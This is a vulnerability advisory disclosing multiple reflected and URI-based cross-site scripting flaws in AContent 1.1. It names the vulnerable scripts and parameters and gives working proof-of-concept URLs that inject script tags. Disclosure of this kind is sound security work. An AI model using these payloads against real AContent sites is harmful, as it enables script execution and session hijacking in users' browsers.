@@ -1,0 +1,93 @@
+
+AContent 1.1 Multiple Cross-Site Scripting Vulnerabilities
+
+
+Vendor: ATutor (Inclusive Design Institute)
+Product web page: http://www.atutor.ca
+Affected version: 1.1 (build r296)
+
+Summary: AContent is an open source learning content authoring system
+and respository used to create interoperable, accessible, adaptive
+Web-based learning content. It can be used along with learning management
+systems to develop, share, and archive learning materials.
+
+Desc: AContent suffers from multiple XSS vulnerabilities when parsing
+user input to multiple parameters via GET and POST method in multiple
+scripts. Attackers can exploit these weaknesses to execute arbitrary
+HTML and script code in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab
+
+
+Advisory ID: ZSL-2011-5032
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5032.php
+
+
+
+31.07.2011
+
+--
+
+
+********** Cross-Site Scripting Reflected (script name / parameter(s) / http method) **********
+
+1. /documentation/frame_header.php                       (p)                            - GET
+2. /documentation/frame_content.php                      (p)                            - GET
+3. /register.php                                         (password_error)               - POST
+4. /user/user_create_edit.php                            (id)                           - GET
+5. /updater/patch_edit.php                               (myown_patch_id)               - GET
+6. /themes/default/login.tmpl.php                        (oauth_token, oauth_callback)  - GET
+7. /themes/default/user/user_group_create_edit.tmpl.php  (id)                           - GET
+8. /themes/default/language/language_add_edit.tmpl.php   (id)                           - GET
+
+
+********** Cross-Site Scripting URI Based (script name) **********
+
+1.  /themes/default/confirmmessage.tmpl.php
+2.  /themes/default/course_category/index.tmpl.php
+3.  /themes/default/language/index.tmpl.php
+4.  /themes/default/language/language_add_edit.tmpl.php
+5.  /themes/default/login.tmpl.php
+6.  /themes/default/tests/create_edit_test.tmpl.php
+7.  /themes/default/tests/question_cats_manage.tmpl.php
+8.  /themes/default/tests/questions.tmpl.php
+9.  /themes/default/user/index.tmpl.php
+10. /themes/default/user/user_group.tmpl.php
+11. /themes/default/user/user_group_create_edit.tmpl.php
+
+
+
+-------------------------------------------------
+
+
+Reflected XSS:
+
+http://localhost/documentation/frame_header.php?p="><script>alert(1)</script>
+http://localhost/documentation/frame_content.php?p="><script>alert(1)</script>
+http://localhost/user/user_create_edit.php?id=71"><script>alert(1)</script>
+http://localhost/updater/patch_edit.php?myown_patch_id=147"><script>alert(1)</script>
+http://localhost/themes/default/login.tmpl.php?oauth_token=187"><script>alert(1)</script>&oauth_callback=187"><script>alert(2)</script>
+http://localhost/themes/default/user/user_group_create_edit.tmpl.php?id=209"><script>alert(1)</script>
+http://localhost/themes/default/language/language_add_edit.tmpl.php?id=353"><script>alert(1)</script>
+
+URI XSS:
+
+http://localhost/themes/default/confirmmessage.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/course_category/index.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/language/index.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/language/language_add_edit.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/login.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/tests/create_edit_test.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/tests/question_cats_manage.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/tests/questions.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/user/index.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/user/user_group.tmpl.php/>"><script>alert(1)</script>
+http://localhost/themes/default/user/user_group_create_edit.tmpl.php/>"><script>alert(1)</script>
